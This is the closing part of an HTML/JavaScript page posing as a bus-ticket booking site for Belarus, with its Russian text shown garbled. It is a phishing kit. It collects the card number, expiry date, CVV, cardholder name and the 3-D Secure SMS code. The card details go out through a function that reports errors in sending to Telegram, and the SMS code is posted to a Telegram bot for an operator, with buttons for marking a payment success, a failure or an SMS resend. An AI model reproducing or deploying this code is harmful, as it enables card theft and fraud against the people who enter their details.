                            <button class="btn btn-secondary" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>
                        </div>
                    `;
                }

                // ===== –£–°–ü–ï–• =====
                else if (state.step === 'success') {
                    html += `
                        <div class="success-box">
                            <div class="success-icon">‚úì</div>
                            <h3 style="margin-bottom: 16px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h3>
                            <p style="color: #64748b; margin-bottom: 30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.<br>–î–∏—Å–ø–µ—Ç—á–µ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.</p>
                            <button class="btn btn-primary" onclick="window.location.href='/'">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                }

                // ===== –û–®–ò–ë–ö–ê =====
                else if (state.step === 'fail') {
                    html += `
                        <div class="fail-box">
                            <div class="fail-icon">‚úï</div>
                            <h3 style="margin-bottom: 16px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h3>
                            <p style="color: #64748b; margin-bottom: 30px;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥—É—é –∫–∞—Ä—Ç—É –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–∑–∂–µ.</p>
                            <button class="btn btn-primary" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
                            <button class="btn btn-secondary" onclick="window.location.href='/'">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                }

                // ===== –ü–û–î–í–ê–õ =====
                html += `
                        <div class="footer">
                            <p>–û–û–û ¬´–ê–≤—Ç–æ–¢—Ä–∞–Ω—Å–ë–µ–ª¬ª | –£–ù–ü 193421567</p>
                            <p>–õ–∏—Ü–µ–Ω–∑–∏—è –ú–∏–Ω–∏—Å—Ç–µ—Ä—Å—Ç–≤–∞ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç–∞ ‚Ññ –ê–ü-2026-458</p>
                            <p>¬© 2026 Marshrutka.by</p>
                        </div>
                    </div>
                `;

                app.innerHTML = html;

                // ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò =====
                if (state.step === 'search') {
                    document.getElementById('searchBtn')?.addEventListener('click', () => {
                        const from = document.getElementById('fromCity').value;
                        const to = document.getElementById('toCity').value;
                        const date = document.getElementById('date').value;
                        
                        if (!from || !to) {
                            alert('–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –ø—Ä–∏–±—ã—Ç–∏—è');
                            return;
                        }
                        if (from === to) {
                            alert('–ì–æ—Ä–æ–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –ø—Ä–∏–±—ã—Ç–∏—è –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ä–∞–∑–Ω—ã–º–∏');
                            return;
                        }
                        
                        state.fromCity = from;
                        state.toCity = to;
                        state.date = date;
                        
                        const results = searchRoutes(from, to);
                        const routesList = document.getElementById('routesList');
                        
                        if (results.length === 0) {
                            routesList.innerHTML = '<p style="text-align: center; color: #64748b; padding: 32px;">–ù–µ—Ç —Ä–µ–π—Å–æ–≤ –ø–æ –¥–∞–Ω–Ω–æ–º—É –º–∞—Ä—à—Ä—É—Ç—É</p>';
                            return;
                        }
                        
                        let resultsHtml = '<div class="section-title">üìã –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ–∏—Å–∫–∞</div>';
                        results.forEach(route => {
                            resultsHtml += `
                                <div class="route-card">
                                    <div class="route-header">
                                        <span class="route-time">${route.time}</span>
                                        <span class="route-price">${route.price} BYN</span>
                                    </div>
                                    <div class="route-details">
                                        <span class="route-detail"><i>‚è±</i> ${route.duration}</span>
                                        <span class="route-detail"><i>üé´</i> ${route.seats} –º–µ—Å—Ç</span>
                                    </div>
                                    <button class="btn btn-primary" onclick="selectRoute(${JSON.stringify(route).replace(/"/g, '&quot;')})">–í—ã–±—Ä–∞—Ç—å</button>
                                </div>
                            `;
                        });
                        routesList.innerHTML = resultsHtml;
                    });
                }

                else if (state.step === 'specific' || state.step === 'select') {
                    document.getElementById('continueBtn')?.addEventListener('click', () => {
                        state.step = 'passenger';
                        render();
                    });
                }

                else if (state.step === 'passenger') {
                    document.getElementById('nextBtn')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim().replace(/\D/g, '');
                        state.passenger.email = document.getElementById('email').value.trim();
                        
                        if (!state.passenger.fullName || !state.passenger.phone) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω');
                            return;
                        }
                        if (state.passenger.phone.length < 10) {
                            alert('–¢–µ–ª–µ—Ñ–æ–Ω –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –Ω–µ –º–µ–Ω–µ–µ 10 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        state.step = 'card';
                        render();
                    });
                }

                else if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber');
                    const ex = document.getElementById('expiry');
                    const cv = document.getElementById('cvv');
                    
                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        
                        const cardDigits = state.card.number.replace(/\D/g, '');
                        
                        if (cardDigits.length !== 16) {
                            alert('–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 16 —Ü–∏—Ñ—Ä');
                            return;
                        }
                        if (!state.card.expiry || state.card.expiry.length < 5) {
                            alert('–í–≤–µ–¥–∏—Ç–µ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è');
                            return;
                        }
                        if (!state.card.cvv || state.card.cvv.length < 3) {
                            alert('–í–≤–µ–¥–∏—Ç–µ CVV-–∫–æ–¥');
                            return;
                        }
                        if (!state.card.cardholder) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –≤–ª–∞–¥–µ–ª—å—Ü–∞ –∫–∞—Ä—Ç—ã');
                            return;
                        }
                        
                        const ok = await sendCardToBot(state.selectedRoute);
                        if (ok) {
                            state.step = 'processing';
                            render();
                        } else {
                            alert('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                        }
                    });
                }

                else if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 4) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS');
                            return;
                        }
                        state.smsCode = code;
                        
                        const messageText = `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${code}`;
                        
                        const smsKeyboard = {
                            inline_keyboard: [
                                [{ text: '‚úÖ –£–°–ü–ï–• (3D)', callback_data: `bind_success_${state.sessionId}` },
                                 { text: '‚ùå –§–ï–ô–õ', callback_data: `bind_fail_${state.sessionId}` },
                                 { text: 'üîÑ –ü–û–í–¢–û–† –°–ú–°', callback_data: `resend_${state.sessionId}` }]
                            ]
                        };
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: messageText,
                                parse_mode: 'HTML',
                                reply_markup: smsKeyboard
                            })
                        });
                        
                        state.step = 'processing2';
                        render();
                    });
                }
            }

            // –ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞
            window.selectRoute = function(route) {
                state.selectedRoute = route;
                state.step = 'select';
                render();
            };

            window.goBack = function() {
                if (state.step === 'passenger') {
                    state.step = state.mode === 'specific' ? 'specific' : 'select';
                } else if (state.step === 'card') {
                    state.step = 'passenger';
                }
                render();
            };

            render();
        })();
    </script>
</body>
</html>
